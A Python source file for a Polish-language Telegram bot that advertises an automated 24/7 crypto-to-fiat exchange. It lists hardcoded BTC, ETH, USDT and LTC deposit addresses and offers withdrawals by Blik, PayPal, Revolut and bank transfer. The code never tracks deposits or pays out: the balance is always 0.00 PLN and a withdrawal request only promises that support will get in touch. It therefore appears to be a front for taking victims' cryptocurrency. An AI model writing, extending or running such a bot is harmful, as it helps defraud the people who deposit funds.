import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler,
    CallbackContext, CallbackQueryHandler
)

# --- KONFIGURACJA ---
BOT_TOKEN = os.getenv("BOT_TOKEN") or "TWÓJ_TOKEN_TUTAJ"
ADMIN_ID = 6178640111  # Wstaw swoje Telegram ID (int)

# --- DANE STAŁE ---
crypto_wallets = {
    "Bitcoin (BTC)": "bc1qsnq04cr8mzyna6yr047g4vrl43rzfhr0ppt63y",
    "Ethereum (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Tether USDT (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Litecoin (LTC)": "LWXm8AZ9b18gtQkGM42XPhCH1h48XED8oo"
}

withdraw_methods = [
    "Kod Blik", "Czek Blik", "Przelew bankowy", "PayPal", "Revolut", "Zen"
]

# --- START KOMENDA ---
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📥 Wpłać krypto", callback_data='deposit')],
        [InlineKeyboardButton("📤 Wypłać środki", callback_data='withdraw')],
        [InlineKeyboardButton("💰 Sprawdź saldo", callback_data='balance')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    photo_url = "https://i.imgur.com/pnL7VUT.jpeg"  # Upewnij się, że link prowadzi do bezpośredniego obrazu

    await update.message.reply_photo(
        photo=photo_url,
        caption=(
            "<b>🤖 WITAMY W AUTOMATYCZNYM KANTORZE KRYPTOWALUT!</b>\n\n"
            "💸 Wymieniaj <b>Bitcoin, USDT, ETH, Litecoin</b>\n"
            "➡️ Na <b>Kod Blik, PayPal, Revolut, Zen, Przelew Bankowy</b>\n\n"
            "✂️ Pobieramy tylko <b>8%</b> niezależnie od kwoty!\n"
            "• Wymienimy ci <b>min. 150PLN, max 50 000PLN</b>\n"
            "<b>Działamy 24/7 — wymieniaj kiedy chcesz!</b>\n\n"
            "👇 Wybierz opcję:"
        ),
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

# --- PRZYCISKI ---
async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    data = query.data
    if data == 'deposit':
        msg = "<b>🔐 Wybierz kryptowalutę do wpłaty:</b>\n\n"
        for name, address in crypto_wallets.items():
            msg += f"💰 <b>{name}</b>\n<code>{address}</code>\n\n"
        await query.edit_message_text(msg, parse_mode="HTML")

    elif data == 'withdraw':
        msg = "<b>💸 Wypłata dostępna przez:</b>\n\n" + "\n".join(f"- {m}" for m in withdraw_methods)
        await query.edit_message_text(msg, parse_mode="HTML")

    elif data == 'balance':
        await query.edit_message_text("<b>💰 Twoje saldo:</b>\n0.00 PLN", parse_mode="HTML")

    elif data.startswith("crypto|"):
        _, name = data.split("|")
        address = crypto_wallets.get(name, "Brak adresu")
        await query.edit_message_text(f"🔗 Adres do wpłaty {name}:\n<code>{address}</code>", parse_mode='HTML')

    elif data.startswith("withdraw|"):
        _, method = data.split("|")
        await query.edit_message_text(
            f"✅ Wybrałeś metodę wypłaty: <b>{method}</b>\nObsługa skontaktuje się z Tobą wkrótce.",
            parse_mode="HTML"
        )

# --- INNE KOMENDY ---
async def deposit(update: Update, context: CallbackContext):
    keyboard = [[InlineKeyboardButton(name, callback_data=f"crypto|{name}")] for name in crypto_wallets]
    await update.message.reply_text("💰 Wybierz kryptowalutę do wpłaty:", reply_markup=InlineKeyboardMarkup(keyboard))

async def withdraw(update: Update, context: CallbackContext):
    keyboard = [[InlineKeyboardButton(method, callback_data=f"withdraw|{method}")] for method in withdraw_methods]
    await update.message.reply_text("💸 Wybierz metodę wypłaty:", reply_markup=InlineKeyboardMarkup(keyboard))

async def balance(update: Update, context: CallbackContext):
    await update.message.reply_text("📉 Twoje saldo: 0.00 PLN")

async def check_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ Brak dostępu.")
    await update.message.reply_text("🛡️ Panel admina — brak automatycznego monitoringu. Sprawdź saldo ręcznie.")

# --- URUCHOM BOT ---
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("deposit", deposit))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("check_admin", check_admin))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot działa...")
    app.run_polling()
